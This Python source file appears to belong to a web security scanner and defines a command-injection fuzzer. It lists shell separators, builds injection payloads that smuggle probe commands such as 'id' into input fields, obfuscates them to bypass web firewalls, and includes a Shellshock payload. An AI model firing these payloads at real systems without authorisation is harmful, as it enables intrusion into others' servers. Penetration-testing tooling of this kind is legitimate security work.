#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class CmdInjection(Fuzzer):

    """CmdInjection"""

    splits = [
        ' ',
        '\t',
        '\x0b',
        ';',
        '\n',
        '\r',
        '\r\n',
        '|',
        '||',
        '&',
        '&&',
        '#',
        '\x00',
        '::',
        '$IFS$9',
        # http://seclists.org/fulldisclosure/2016/Nov/67
        '\x1a',
    ]

    special = [
        '\n',
        '!',
        '"',
        '$',
        '%',
        '&',
        "'",
        '(',
        ')',
        '*',
        '+',
        '-',
        '.',
        '/',
        ';',
        '<',
        '=',
        '>',
        '?',
        '[',
        '\\',
        ']',
        '^',
        '`',
        '{',
        '|',
        '}',
        '~',
        '\xff'
    ]

    testcmd = [
        'id',
        'whoami',
        'which',
        'pwd',
        'ls',
        'dir',
        'w',
        'sleep',
    ]

    prefix = [
        '/usr/local/sbin',
        '/usr/local/bin',
        '/usr/sbin',
        '/usr/bin',
        '/sbin',
        '/bin',
    ]

    whitespaces = ["${IFS}", "+", "\x09", "\x0b", " "]

    def __init__(self, os='linux', shell='bash'):
        super(CmdInjection, self).__init__()
        self.os = os
        self.shell = shell

    @classmethod
    def fuzz(cls, cmd="id"):
        # some system do not have id
        return [
            "|%s" % cmd,
            "||%s" % cmd,
            "&%s" % cmd,
            "&&%s" % cmd,
            " | %s" % cmd,
            " || %s" % cmd,
            " & %s" % cmd,
            " && %s" % cmd,
            "=%s|'%s'!''" % (cmd, cmd),
            ";%s" % cmd,
            ");%s" % cmd,
            ";%s#" % cmd,
            "\n%s" % cmd,
            "\r%s" % cmd,
            "\r\n%s" % cmd,
            "`%s`" % cmd,
            "$(%s)" % cmd,
            "${%s}" % cmd,
            "{%s}" % cmd,
            "\x00`%s`" % cmd,
        ]

    @classmethod
    def mutate(cls, cmd):
        return [
            "'".join(list(cmd)),
            '"'.join(list(cmd)),
            '\\'.join(list(cmd)),
            cmd.replace(' ', '$IFS'),
        ]

    @classmethod
    def wafbypass(cls):
        return [
            "i\\d",
            "i''d",
            "/u??/bin/id",
            "a=i;b=d;$a$b",
        ]

    @classmethod
    def shellshock(cls):
        return '() { :;}; /usr/bin/id'
